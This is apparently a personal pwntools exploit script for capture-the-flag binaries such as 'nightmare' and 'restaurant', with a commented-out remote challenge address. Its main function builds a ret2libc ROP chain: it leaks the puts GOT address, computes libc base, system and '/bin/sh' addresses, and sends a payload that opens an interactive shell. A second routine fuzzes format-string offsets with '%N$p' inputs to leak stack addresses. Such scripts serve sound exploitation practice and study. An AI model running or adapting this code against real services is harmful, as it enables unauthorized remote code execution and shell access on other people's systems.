#!/usr/bin/python2

import sys
import os
import re
import struct
from pwn import *
import argparse

##use python2 not python3 for ease of generating strings for payloads 

################################################################################################################
#           Building Payload for Exploit
#
#
################################################################################################################


#exe="./restaurant"
#exe="./what_does_the_f_say"
exe="./nightmare"

elf=context.binary=ELF(exe, checksec=False)
context.log_level="debug"
#context.log_level="error"
def exploit_init():
    pop_rdi=0x4010a3

    pprint(elf.got)
    final_payload=flat(
            {8:[
                pop_rdi,
                elf.got.puts,
                elf.plt.puts,
                elf.symbols.main
             ]}
    )

    print("final_payload", final_payload)
    target=q_start()

    initial_payload=b'1'
    target.recv()
    target.sendlineafter("2. Drink something\x0a> ", initial_payload)
    #target.sendline(initial_payload)
    #target.wait()

    #target.sendlineafter("You can add these ingredients to your dish:", final_payload)
    target.sendlineafter("> ", final_payload)
    ret_adr=target.recv()
    #got_puts_adr = unpack(ret_adr[:6].ljust(8, b"\x00"))
    got_puts_adr = unpack(ret_adr.ljust(8, b"\x00"))
    info("got_puts_adr: %#x :", got_puts_adr)
    ##target.interactive()

    ##offset of puts within stdc lib
    ##0x80aa0
    ##base address of libc = got_puts_adr - offset_puts_within_libc
    base_adr_libc=got_puts_adr-0x80aa0
    ##info("base_adr_libc: %#x :", base_adr_libc)
    ##offset of system within stdc lib
    #000000000004f550
    adr_system = base_adr_libc + 0x4f550
    info("adr_system: %#x :", adr_system)

    bin_sh_offset=0x1b3e1a 
    bin_sh_adr=base_adr_libc + bin_sh_offset
    info("bin_sh_adr: %#x :", bin_sh_adr)
    second_payload=flat(
            {996:[
                pop_rdi,
                bin_sh_adr,
                adr_system
             ]}
    )
    
    target.send(second_payload)
    target.interactive()

################################################################################################################
#           GDB Script Setup
#            
#
################################################################################################################

gdbscript='''
piebase
breakrva 4372
continue
'''.format(**locals())




################################################################################################################
#           Testing Exploit
#           Command line args used to switch between testing locally with qemu + testing remotely
#
################################################################################################################
x86_64_qemu_args=["qemu-x86_64", "-L", "/usr/x86_64-linux-gnu/"]

def q_start(argv=[], *a , **kwargs):
    if args.REMOTE:
        return remote(sys.argv[1], sys.argv[2], *a, **kwargs)
    elif args.GDB:
        return gdb.debug(x86_64_qemu_args +[exe], gdbscript=gdbscript, *a, **kwargs)
    else:
        return process(x86_64_qemu_args +[exe], *a, **kwargs)


##remote exploit
#target=process("nc")
##target=remote("167.99.207.150", 30511)

##have to use sendline() not send() so that the trailing \n is appended to the bytes payload
##target.sendline(final_payload)

def build_exploit_payload(test_adr: dict()):
    for i in range(8,40):
        try:
            target=q_start()
            initial_payload=b'2'
            initial=b'1'
            exit_payload=b'3'
            #fuzz_payload=b''
            #fuzz_payload_0 = ('%p'*i).format(i).encode()
            #fuzz_payload = '%{0}$p'.format(i).encode()
            fuzz_payload = bytes(('%{0}$p '.format(i)).encode())
             #fuzz_payload += '\x80\x4f\x98{0}%s'.format(fuzz_payload_0).encode()
            ret_adr=exploit(target, initial_payload, i)
            ###target.recv()
            ###target.sendlineafter(b'3. Exit\x0a> ', initial_payload)
            
            #target.recv()
            #What do you wanna do?
            #1. Scream into the void.
            #2. Try to escape this nightmare.
            #target.recv()
            
            ###target.sendlineafter('>', fuzz_payload) 
            ###fmt_str_result=target.recvline()
            
            #fmt_str_result= target.recvuntil('>')
            ##Red or Green Kryptonite? 0x4002804df0 0x1d 0xc00 0x1999999999999999 Enjoy your Kryptonite vodka!
            print("Target {0}: {1}".format(i, ret_adr))
            updated_target = b'22' #first value can likely be any char, since we have to account for overwriting the value after the first payload (when the len(firstpayload) > 5)
            res=exploit(target, updated_target, i)
            print("Target {0}: {1}".format(i, res))
            removechars=re.compile(r"\s+")
            adr_matchgroup=re.compile(r"(0x[0-9a-fA-F]+)")
            newstr_match=re.search(adr_matchgroup, str(ret_adr))
            if newstr_match:
                test_newstr=newstr_match.group()
            ##test_newstr=re.sub(removechars, '', str(ret_adr))
            #test_newstr=unpack(ret_adr)
            #.strip(removechars)
                print("Test string, using regex pattern for string strip() method: {0}".format(test_newstr))
            #if str(ret_adr).strip(r"\s+") != '(nil)':
                ##test_retadr = str(ret_adr)
                test_retadr = test_newstr
                print("Original test address: {0}".format(test_retadr))
                test_retadr.strip(r"\s+")
                print("updated test address: {0}".format(test_retadr))
                test_adr[i]=test_retadr
                #unpack(res[:6].ljust(8, b"\x00"))
            testprintf_adr=elf.symbols.printf
            print("Testing read of printf address: {0}".format(testprintf_adr))
            #target.sendlineafter("2. Space food\x0a", exit_payload)
            #target.recv()
            target.close()
            #return test_adr
        except EOFError as e:
            pass
            
    return test_adr

##ebp - 8 = stackarg[1]= ret_adr of printf
##ebp - 16 = stackarg[2] = 0x5 (length of string for comparison in strncmp()) 
##ebp - 24 = stackarg[3] = 0x6c
##ebp - 32 = stackarg[4] = 0x1 
##ebp - 40 = stackarg[5] = (nil) 
##ebp - 48 = stackarg[6] = b'%{i}$p' 
##ebp - 56 = stackarg[7] = random garb?? idk what is being stored here but it looks like nonsense
##ebp - 62 = stackarg[8] = potentially ret adr of strncmp




def exploit(target, initial_payload, payload):
    ##target=q_start()
    #initial_payload=b'2'

    fuzz_payload = bytes(('%{0}$p '.format(payload)).encode())
    target.recv()
    target.sendlineafter(b'3. Exit\x0a> ', initial_payload)
    target.sendlineafter('>', fuzz_payload) 
    ret_adr=target.recvline()
    return ret_adr
    ##target.close()
#    got_puts_adr = unpack(ret_adr[:6].ljust(8, b"\x00"))
#    info("got_puts_adr: %#x :", got_puts_adr)

    ##offset of puts within stdc lib
    ##0x80aa0
    ##base address of libc = got_puts_adr - offset_puts_within_libc
##    base_adr_libc=got_puts_adr-0x80aa0
##    info("base_adr_libc: %#x :", base_adr_libc)
    ##offset of system within stdc lib
    #000000000004f550
##    adr_system = base_adr_libc + 0x4f550
##    info("adr_system: %#x :", adr_system)

##    bin_sh_offset=0x1b3e1a 
##    bin_sh_adr=base_adr_libc + bin_sh_offset
##    info("bin_sh_adr: %#x :", bin_sh_adr)

#    second_payload=flat(
#            {1024:[
#                pop_rdi,
#                bin_sh_adr,
#                adr_system
#             ]}
#    )
    
#    target.send(second_payload)
#    target.interactive()

    #print("second_payload", second_payload)




    ##yy"You can add these ingredients to your dish:",
    #🍅
    ##\xf0\x9f\x8d\x85
    ##1. 🍅
    ##\xf0\x9f\x8d\x85
    #2. 🧀
    ##\xf0\x9f\xa7\x80
    ##You can also order something else.


    ##offset of puts within stdc lib
    ##0x80aa0
    ##base address of libc = got_puts_adr - offset_puts_within_libc
    ##base_adr_libc=got_puts_adr-0x80aa0
    ##info("base_adr_libc: %#x :", base_adr_libc)
    ##offset of system within stdc lib
    #000000000004f550
    ##adr_system = base_adr_libc + 0x4f550
    ##info("adr_system: %#x :", adr_system)

    ##bin_sh_offset=0x1b3e1a 
    ##bin_sh_adr=base_adr_libc + bin_sh_offset
    ##info("bin_sh_adr: %#x :", bin_sh_adr)


    #0x00400ec5 void *buf

################################################################################################################
#           Argparse template - more detailed/fine-grained command line controls
#
################################################################################################################

def setup_options():
    parser = argparse.ArgumentParser(description='Generate exploits for programs vulnerable to memory corruption vulnerabilities; includes functions for identifying/calculating address offset and padding, creating payloads and employing various common mitigation bypass techniques.')
#    parser.add_argument('-gdb', nargs='?', type=bool, default=False,  help='Run the program with gdb for debugging')
    #parser.add_argument('--remote', help='Send the exploit to the remote target at [IP] [PORT]')
#    subparsers = parser.add_subparsers()
#    remote_subparser= subparsers.add_parser('remote', help='Send the exploit to the remote target at [IP] [PORT]')
#    remote_subparser.add_argument('IP', type=str,  help='IP Address of remote target')
#    remote_subparser.add_argument('PORT', type=int,  help='Port of remote target')
#    #subparsers = parser.add_subparsers()
#    #parser.add_argument('-write-payloads', action="store_true",  help='Option to retrieve file or files from generated list of all files on target device')
#    #parser.add_argument('-IP', type=int,  help='IP Address of remote target')
#    #parser.add_argument('-PORT', type=int,  help='Port of remote target')
    args = parser.parse_args()
#    #remote_args = remote_subparser.parse_args()
    return parser, args

def exploit_preamble(parser, args):
    r=args.remote
    #payload_num=int(args.payloads)
#    #payload_data = '{"command":' + cmd + '}'
    print("args:", args)
    print("remote:", r)

################################################################################################################
#
################################################################################################################

if __name__ == '__main__':
    #exploit_init()
    test_adr={i: '' for i in range(40)}
    final_test_adr=build_exploit_payload(test_adr)
    print("Final test address list: {0}".format(final_test_adr))
##      0x4002804df00x1d0xc000x19999999999999990x4002a26a800x4002804f880x202804e200x70257025702570250x70257025702570250x70257025702570250x25702570250x2f2f2f2f2f2f2f2f0xa8d1992dd5e285000x4002804e40

